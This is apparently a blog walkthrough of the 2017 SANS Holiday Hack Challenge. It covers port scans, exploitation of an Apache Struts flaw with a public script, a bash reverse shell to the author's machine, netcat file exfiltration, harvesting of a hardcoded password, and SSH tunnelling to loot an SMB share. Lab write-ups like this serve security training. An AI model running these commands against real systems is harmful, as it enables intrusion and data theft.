---
title: 2017 SANS Holiday Hack Challenge
date: 2017-12-16
---


## Introduction

Given that I had the pleasure of having the wonderful Ed Skoudis (@edskoudis) as my instructor for SANS 560 this past summer, I got to hear all about the Counter Hack (his company) constructed Holiday Hack Challenges, which are made available each year. Unfortunately, I wasn't able to carve out any time since then to actually work on the previous years' challenges, but I figured that this was my chance to get in on the phone!

## Getting Started

Step one in these things is always to read the instructions. In this case they can be found at: https://www.holidayhackchallenge.com/2017/ which includes among other things, the scope of the challenge:

> SCOPE: For this entire challenge, you are authorized to attack ONLY the Letters to Santa system at l2s.northpolechristmastown.com AND other systems on the internal 10.142.0.0/24 network that you access through the Letters to Santa system. You are also authorized to download data from nppd.northpolechristmastown.com, but you are not authorized to exploit that machine or any of the North Pole and Beyond puzzler, chat, and video game components of the Holiday Hack Challenge.

## Test results

### l2s.northpolechristmastown.com

Small scan:

```
root@kali:~# nmap l2s.northpolechristmastown.com

Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-16 19:59 EST
Nmap scan report for l2s.northpolechristmastown.com (35.185.84.51)
Host is up (0.035s latency).
Other addresses for l2s.northpolechristmastown.com (not scanned):
rDNS record for 35.185.84.51: 51.84.185.35.bc.googleusercontent.com
Not shown: 996 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  open   https
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 18.14 seconds
```

Full ports didn't get me any farther:

```
root@kali:~# nmap l2s.northpolechristmastown.com -p0-

Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-16 20:01 EST
Nmap scan report for l2s.northpolechristmastown.com (35.185.84.51)
Host is up (0.056s latency).
Other addresses for l2s.northpolechristmastown.com (not scanned):
rDNS record for 35.185.84.51: 51.84.185.35.bc.googleusercontent.com
Not shown: 65532 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  open   https
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 710.85 seconds
```



## Winter Wonder Landing

> Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball.

Is how the Hack Challenge begins... Well, clearly I didn't read that closely enough, as I actually started my investigation over in the "Winconceivable: The Cliffs of Windsanity"

## Breaking in to Letters to Santa Application

- Looked in l2s.northpolechristmastown.com web source code, and discovered a "dev.northpolechristmastown.com" server, which was running an Apache Struts application.

```
root@kali:~# host l2s.northpolechristmastown.com
l2s.northpolechristmastown.com has address 35.185.84.51
root@kali:~# host dev.northpolechristmastown.com
dev.northpolechristmastown.com has address 35.185.84.51
```

- Followed hints from Sparkle Redberry in "North Pole and Beyond", which pointed me towards: https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code which included a link to some simple exploit code I was able to make use of https://github.com/chrisjd20/cve-2017-9805.py

- That allowed me to run:

```
python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 'ping -c 2 xx.xx.xx.xx'
```

Where `xx.xx.xx.xx` is my local host where I was running a tcpdump of the traffic:

```
root@kali:~# tcpdump -nn
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
05:29:29.604260 IP 35.196.226.77 > xx.xx.xx.xx: ICMP echo request, id 32706, seq 1, length 64
05:29:29.604290 IP xx.xx.xx.xx > 35.196.226.77: ICMP echo reply, id 32706, seq 1, length 64
05:29:30.605486 IP 35.196.226.77 > xx.xx.xx.xx: ICMP echo request, id 32706, seq 2, length 64
05:29:30.605509 IP xx.xx.xx.xx > 35.196.226.77: ICMP echo reply, id 32706, seq 2, length 64
```

In that traffic, I saw that I was actually getting connections back not from the host that the webserver is listening on (`35.185.84.51`), but actually a different IP address (`35.196.226.77`), BUT I had proven that I could get connections out of that server and back to my local host system!

In order to take advantage of that vulnerability, I started a local netcat listener on port 5555:

```
root@kali:~# nc -l -p 5555
```

And in a separate terminal, started a bash reverse shell from that host back to my local host on the listening port 5555

```
python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 'bash -i >& /dev/tcp/xx.xx.xx.xx/5555 0>&1'
```

Voila! We have a prompt!

```
alabaster_snowball@l2s:/tmp/asnow.3lNOwcLHyQVgcfuNB93khBHs$
```

From there we can grab the /etc/hosts file (to find more targets):

```
alabaster_snowball@l2s:/tmp/asnow.3lNOwcLHyQVgcfuNB93khBHs$ cat /etc/hosts
cat /etc/hosts
127.0.0.1	localhost l2s dev.northpolechristmastown.com l2s.northpolechristmastown.com
10.142.0.5	mail.northpolechristmastown.com ewa.northpolechristmastown.com
10.142.0.13	eaas.northpolechristmastown.com
10.142.0.6	edb.northpolechristmastown.com
::1		localhost l2s ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

10.142.0.3 hhc17-apache-struts1.c.holidayhack2017.internal hhc17-apache-struts1  # Added by Google
169.254.169.254 metadata.google.internal  # Added by Google
```

And the `/etc/passwd` file:

```
alabaster_snowball@l2s:/tmp/asnow.3lNOwcLHyQVgcfuNB93khBHs$ cat /etc/hosts
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
uuidd:x:105:109::/run/uuidd:/bin/false
ntp:x:106:110::/home/ntp:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
gke-ed150e57664e0ca33a0d:x:1000:1001::/home/gke-ed150e57664e0ca33a0d:/bin/bash
chris:x:1002:1003::/home/chris:/bin/bash
alabaster_snowball:x:1003:1004:Alabaster Snowball,,,:/home/alabaster_snowball:/bin/rbash
daniel:x:1004:1005::/home/daniel:/bin/bash
messagebus:x:108:112::/var/run/dbus:/bin/false
ron:x:1005:1006::/home/ron:/bin/bash
dpendolino:x:1006:1007::/home/dpendolino:/bin/bash
tkh16:x:1007:1008::/home/tkh16:/bin/bash
jeff:x:1008:1009::/home/jeff:/bin/bash
tom:x:1009:1010::/home/tom:/bin/bash
```

We can also, as prompted by question #2, look for the Great Book Page in the root of the webserver:

```
alabaster_snowball@l2s:/tmp/asnow.3lNOwcLHyQVgcfuNB93khBHs$ cd /var/www/html
alabaster_snowball@l2s:/var/www/html$ ls -la
ls -la
total 1776
drwxrwxrwt 6 www-data           www-data              4096 Dec 20 06:04 .
drwxr-xr-x 3 root               root                  4096 Oct 12 14:35 ..
drwxr-xr-x 2 root               www-data              4096 Oct 12 19:03 css
drwxr-xr-x 3 root               www-data              4096 Oct 12 19:40 fonts
-r--r--r-- 1 root               www-data           1764298 Dec  4 20:25 GreatBookPage2.pdf
drwxr-xr-x 2 root               www-data              4096 Oct 12 19:14 imgs
-rw-r--r-- 1 root               www-data             14501 Nov 24 20:53 index.html
drwxr-xr-x 2 root               www-data              4096 Oct 12 19:11 js
-rwx------ 1 www-data           www-data               231 Oct 12 21:25 process.php
-rw-r--r-- 1 alabaster_snowball alabaster_snowball     340 Dec 20 04:01 .quackquackhere.php
-rw-r--r-- 1 alabaster_snowball alabaster_snowball     344 Dec 20 05:46 .webshell.php
```

There it is! Now how to get it...

Well, one option is to start a netcat listener on my local machine:

```
root@kali:~$ nc -l -p 6666 > GreatBookPage2.pdf
```

And to then feed in the book from the server:

```
alabaster_snowball@l2s:/var/www/html$ nc xx.xx.xx.xx 6666 < GreatBookPage2.pdf
```

I also found a `.webshell.php` file in the web server root, that I was able to test and verify that I could access it via https://l2s.northpolechristmastown.com/.webshell.php

That provided a prompt which I was able to issue arbitrary commands into, which would output the results to the screen. E.g.

```
cat /etc/hosts
```

Produced:

```
127.0.0.1	localhost l2s dev.northpolechristmastown.com l2s.northpolechristmastown.com
10.142.0.5	mail.northpolechristmastown.com ewa.northpolechristmastown.com
10.142.0.13	eaas.northpolechristmastown.com
10.142.0.6	edb.northpolechristmastown.com
::1		localhost l2s ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

10.142.0.3 hhc17-apache-struts1.c.holidayhack2017.internal hhc17-apache-struts1  # Added by Google
169.254.169.254 metadata.google.internal  # Added by Google
```

And:

```
ifconfig
```

Produced:

```
eth0: flags=4163  mtu 1460
        inet 10.142.0.3  netmask 255.255.255.255  broadcast 10.142.0.3
        ether 42:01:0a:8e:00:03  txqueuelen 1000  (Ethernet)
        RX packets 3758417  bytes 415288667 (396.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12718359  bytes 2481338667 (2.3 GiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10
        loop  txqueuelen 1  (Local Loopback)
        RX packets 1971654  bytes 680846691 (649.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1971654  bytes 680846691 (649.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

So that appears to be a webshell running on the host, but after some more digging, it would seem that it might have been something from another attacker, as it disappeared on me...

### Getting Credit...

It was at this point I realized I hadn't actually gotten my credit for Page 2 of the Great Book, so I went back in to my Stocking and uploaded the SHA1 of the page, and got my credit!

https://www.holidayhackchallenge.com/2017/pages/aa814d1c25455480942cb4106e6cde84be86fb30/GreatBookPage2.pdf

### Digging for the Password

The next step was to try to dig out Alabaster Snowball's password. This was mostly done via the shell, and in order to make things easier, I figured I would start breaking out of my restricted shell by modifying and updating my `PATH`:

```
alabaster_snowball@l2s:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

This allowed me to actually find the tools that I wanted and needed to be using.

It was around this time that I also started poking (a little) at the rest of the environment, coming to find that the dev server was being run out of nginx:

```
alabaster_snowball@l2s:~$ cat /etc/nginx/sites-enabled/default
upstream backends {
    server 127.0.0.1:8080;
}

[...snip...]

server {
    listen 80;
    index index.php index.html index.htm;
    server_name dev.northpolechristmastown.com;
    location / {
        proxy_pass http://backends/;
        root /var/www/html;
        allow 107.139.194.111;
        allow 24.214.105.179;
        allow 24.214.166.143;
        allow all;
    }
}
```

Which was running off port 8080, which I was able to trace to a Java application:

```
alabaster_snowball@l2s:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      28739/python
tcp        0      0 0.0.0.0:44478           0.0.0.0:*               LISTEN      7528/nc
tcp        0      0 127.0.0.1:4322          0.0.0.0:*               LISTEN      2144/python
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      794/java
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      794/java
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
udp        0      0 10.142.0.3:123          0.0.0.0:*                           -
udp        0      0 127.0.0.1:123           0.0.0.0:*                           -
udp        0      0 0.0.0.0:123             0.0.0.0:*                           -
udp6       0      0 ::1:123                 :::*                                -
udp6       0      0 :::123                  :::*                                -
```

Ultimately running out of the `/opt/apache-tomcat` directory. From there I started doing some searching to try to find the password:

```
alabaster_snowball@l2s:/opt/apache-tomcat$ grep -iR alabaster *
logs/catalina.out:2017-12-20 03:57:40,835 DEBUG [http-127.0.0.1-8080-12] example.OrdersController (OrdersController.java:66) - Create new order org.demo.rest.example.Order@9a63a2[id=<null>,clientName=alabaster,amount=138]
logs/catalina.out:2017-12-20 04:32:22,971 WARN  [http-127.0.0.1-8080-7] dispatcher.Dispatcher (Dispatcher.java:614) - Could not find action or result: /alabasters_archive/
logs/catalina.out:com.opensymphony.xwork2.config.ConfigurationException: There is no Action mapped for action name alabasters_archive.
webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = "alabaster_snowball";
webapps/ROOT/WEB-INF/content/orders-index.jsp:    <meta name="author" content="Alabaster Snowball">
webapps/ROOT/WEB-INF/content/orders-show.jsp:    <meta name="author" content="Alabaster Snowball">
webapps/ROOT/WEB-INF/content/orders-editNew.jsp:    <meta name="author" content="Alabaster Snowball">
webapps/ROOT/WEB-INF/content/orders-deleteConfirm.jsp:    <meta name="author" content="Alabaster Snowball">
webapps/ROOT/WEB-INF/content/orders-edit.jsp:    <meta name="author" content="Alabaster Snowball">
work/Catalina/localhost/_/org/apache/jsp/WEB_002dINF/content/orders_002dindex_jsp.java:      out.write("    <meta name=\"author\" content=\"Alabaster Snowball\">\n");
Binary file work/Catalina/localhost/_/org/apache/jsp/WEB_002dINF/content/orders_002ddeleteConfirm_jsp.class matches
Binary file work/Catalina/localhost/_/org/apache/jsp/WEB_002dINF/content/orders_002dshow_jsp.class matches
work/Catalina/localhost/_/org/apache/jsp/WEB_002dINF/content/orders_002ddeleteConfirm_jsp.java:      out.write("    <meta name=\"author\" content=\"Alabaster Snowball\">\n");
work/Catalina/localhost/_/org/apache/jsp/WEB_002dINF/content/orders_002deditNew_jsp.java:      out.write("    <meta name=\"author\" content=\"Alabaster Snowball\">\n");
work/Catalina/localhost/_/org/apache/jsp/WEB_002dINF/content/orders_002dshow_jsp.java:      out.write("    <meta name=\"author\" content=\"Alabaster Snowball\">\n");
Binary file work/Catalina/localhost/_/org/apache/jsp/WEB_002dINF/content/orders_002dindex_jsp.class matches
Binary file work/Catalina/localhost/_/org/apache/jsp/WEB_002dINF/content/orders_002dedit_jsp.class matches
Binary file work/Catalina/localhost/_/org/apache/jsp/WEB_002dINF/content/orders_002deditNew_jsp.class matches
work/Catalina/localhost/_/org/apache/jsp/WEB_002dINF/content/orders_002dedit_jsp.java:      out.write("    <meta name=\"author\" content=\"Alabaster Snowball\">\n");
```

Which yielded a few promising paths, such as:

```
alabaster_snowball@l2s:/opt/apache-tomcat$ cat webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class
<-INF/classes/org/demo/rest/example/OrderMySql.class
    public class Connect {
            final String host = "localhost";
            final String username = "alabaster_snowball";
            final String password = "stream_unhappy_buy_loss";
[...snip...]
```

Which contained the password for Alabaster that I was able to verify with:

```
root@kali:~# ssh alabaster_snowball@35.196.226.77
alabaster_snowball@35.196.226.77's password:
alabaster_snowball@l2s:/tmp/asnow.99ZsqGTTLDb0HNDLA4mIRNaz$
```


## Picking Up After Christmas

Now at this point, we cut forward a week until I'm back from my own trip to the fridged north (Connecticut), and I start getting back into the game. One of the first things that I try to do is to re-connect to the dev.northpolechristmastown.com server, from my Kali host, and I notice that I can't...

I attempt to re-exploit the Struts application there, but don't see any packets show up at my host... I tried doing a new nmap of the system, and found that the server does still appear to be up, but I can't seem to re-exploit it...

That being said, I had already gotten the password from the host, so I was able to use that to connect over SSH to the host:

```
root@kali:~# ssh alabaster_snowball@35.185.84.51
```

That landed me in the same restricted bash shell as before breaking for Christmas.

## Investigating the SMB Shares

For question #3 in the Hack challenge, it is necessary to identify the share name for the SMB server on the internal 10.142.0.0/24 network. To do so, I was able to execute `nmap` from the Letters 2 Santa server to explore the internal network:

```
alabaster_snowball@l2s:/tmp/asnow.sguTJiwVWkeIi9gccIcaJSNU$ nmap -PS445 10.142.0.0/24 -p 445

Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-31 23:02 UTC
Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
Host is up (0.00022s latency).
PORT    STATE  SERVICE
445/tcp closed microsoft-ds

Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
Host is up (0.0010s latency).
PORT    STATE  SERVICE
445/tcp closed microsoft-ds

Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
Host is up (0.00092s latency).
PORT    STATE  SERVICE
445/tcp closed microsoft-ds

Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
Host is up (0.00018s latency).
PORT    STATE  SERVICE
445/tcp closed microsoft-ds

Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
Host is up (0.00098s latency).
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
Host is up (0.00090s latency).
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
Host is up (0.000040s latency).
PORT    STATE  SERVICE
445/tcp closed microsoft-ds

Nmap done: 256 IP addresses (7 hosts up) scanned in 1.85 seconds
```

This identified two servers of the 7 hosts where SMB (port 445) was running. Those servers were:

- `10.142.0.7` - hhc17-smb-server.c.holidayhack2017.internal
- `10.142.0.8` - hhc17-emi.c.holidayhack2017.internal

Now that I had identified the SMB servers, I was able to use SSH port forwarding to forward a connection from my local host out to the SMB server with:

```
root@kali:~# ssh -L 445:10.142.0.7:445 alabaster_snowball@35.185.84.51
```

In a separate window, I was then able to connect to that SMB host with the following command, and identity the Sharename as "FileStor":

```
root@kali:~# smbclient -L localhost -p 445 -U alabaster_snowball
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\alabaster_snowball's password:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	FileStor        Disk      
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
Connection to localhost failed (Error NT_STATUS_CONNECTION_REFUSED)
Failed to connect with SMB1 -- no workgroup available
```

From there, I started looking to connect to the share to see what was available. Not having much experience with SMB myself, I found http://www.learnlinux.org.za/courses/build/net-admin/ch08s02.html which taught me that I could connect to the share:

```
root@kali:~# smbclient \\\\localhost\\FileStor -p 445 -U alabaster_snowball
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\alabaster_snowball's password:
Try "help" to get a list of possible commands.
smb: \>
```

And plunder the files I found from it:

```
smb: \> pwd
Current directory is \\localhost\FileStor\
smb: \> ls
  .                                   D        0  Sat Dec 30 23:07:11 2017
  ..                                  D        0  Sat Dec 30 23:07:11 2017
  BOLO - Munchkin Mole Report.docx      A   255520  Wed Dec  6 16:44:17 2017
  GreatBookPage3.pdf                  A  1275756  Mon Dec  4 14:21:44 2017
  MEMO - Password Policy Reminder.docx      A   133295  Wed Dec  6 16:47:28 2017
  Naughty and Nice List.csv           A    10245  Thu Nov 30 14:42:00 2017
  Naughty and Nice List.docx          A    60344  Wed Dec  6 16:51:25 2017

		13106687 blocks of size 4096. 9618145 blocks available
smb: \> get GreatBookPage3.pdf
getting file \GreatBookPage3.pdf of size 1275756 as GreatBookPage3.pdf (776.7 KiloBytes/sec) (average 776.7 KiloBytes/sec)
smb: \> get "BOLO - Munchkin Mole Report.docx"
getting file \BOLO - Munchkin Mole Report.docx of size 255520 as BOLO - Munchkin Mole Report.docx (293.9 KiloBytes/sec) (average 609.6 KiloBytes/sec)
smb: \> get "MEMO - Password Policy Reminder.docx"
getting file \MEMO - Password Policy Reminder.docx of size 133295 as MEMO - Password Policy Reminder.docx (154.8 KiloBytes/sec) (average 493.5 KiloBytes/sec)
smb: \> get "Naughty and Nice List.csv"
getting file \Naughty and Nice List.csv of size 10245 as Naughty and Nice List.csv (24.8 KiloBytes/sec) (average 442.4 KiloBytes/sec)
smb: \> get "Naughty and Nice List.docx"
getting file \Naughty and Nice List.docx of size 60344 as Naughty and Nice List.docx (97.4 KiloBytes/sec) (average 393.9 KiloBytes/sec)
smb: \> exit
```

Seeing as one of the files was a Great Book page, I was able to compute the SHA-1 and get credit for finding the page.

I then took some time to install tools into my Kali Linux environment which would allow me to view the documents that I had obtained from the server:

```
root@kali:~# apt install libreoffice evince
```

Inside of the "BOLO - Munchkin Mole Report.docx" document, I found a reference to: `puuurzgexgull` which might potentially be a password to use later. I'll keep it in mind in case I find a place to try it out later.







## Notes:

mail.northpolechristmastown.com (10.142.0.5)
    - Running OpenSSL 7.2p2, which may be vulnerable to: https://www.exploit-db.com/exploits/40136/
    - Has /robots.txt file which contains:
    ```
    User-agent: *
    Disallow: /cookie.txt
    ```
    - That `cookie.txt` in turn contains:
    ```
    //FOUND THESE FOR creating and validating cookies. Going to use this in node js
    function cookie_maker(username, callback){
        var key = 'need to put any length key in here';
        //randomly generates a string of 5 characters
        var plaintext = rando_string(5)
        //makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters
        //Removes equals from output so as not to mess up cookie. decrypt function can account for this without erroring out.
        var ciphertext = aes256.encrypt(key, plaintext).replace(/\=/g,'');
        //Setting the values of the cookie.
        var acookie = ['IOTECHWEBMAIL',JSON.stringify({"name":username, "plaintext":plaintext,  "ciphertext":ciphertext}), { maxAge: 86400000, httpOnly: true, encode: String }]
        return callback(acookie);
    };
    function cookie_checker(req, callback){
        try{
            var key = 'need to put any length key in here';
            //Retrieving the cookie from the request headers and parsing it as JSON
            var thecookie = JSON.parse(req.cookies.IOTECHWEBMAIL);
            //Retrieving the cipher text
            var ciphertext = thecookie.ciphertext;
            //Retrievingin the username
            var username = thecookie.name
            //retrieving the plaintext
            var plaintext = aes256.decrypt(key, ciphertext);
            //If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key
            if (plaintext === thecookie.plaintext) {
                return callback(true, username);
            } else {
                return callback(false, '');
            }
        } catch (e) {
            console.log(e);
            return callback(false, '');
        }
    };
    ```


## Credentials:

| user | password | discovered_on | works_on |
| alabaster_snowball | stream_unhappy_buy_loss | 35.196.226.77 | 35.196.226.77 |




## Questions to be Answered

1) Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?

> "About This Book..." -- https://www.holidayhackchallenge.com/2017/pages/6dda7650725302f59ea42047206bd4ee5f928d19/GreatBookPage1.pdf

2) Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?

For hints associated with this challenge, Sparkle Redberry in the Winconceivable: The Cliffs of Winsanity Level can provide some tips.

> "On the Topic of Flying Animals"

> Alabaster's password: "stream_unhappy_buy_loss"

3) The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?

For hints, please see Holly Evergreen in the Cryokinetic Magic Level.

> The file server share name on the server is: "FileStor"


4) Elf Web Access (EWA) is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?

Pepper Minstix provides some hints for this challenge on the There's Snow Place Like Home Level.

5) How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? What are the names of at least six insider threat moles? Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?

Minty Candycane offers some tips for this challenge in the North Pole and Beyond.

6) The North Pole engineering team has introduced an Elf as a Service (EaaS) platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?

For hints on this challenge, please consult with Sugarplum Mary in the North Pole and Beyond.

7) Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI) to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from C:\GreatBookPage7.pdf. What does The Great Book page describe?

Shinny Upatree offers hints for this challenge inside the North Pole and Beyond.

8) Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com. Who wrote the letter?

For hints on solving this challenge, please locate Wunorse Openslae in the North Pole and Beyond.

9) Which character is ultimately the villain causing the giant snowball problem. What is the villain's motive?
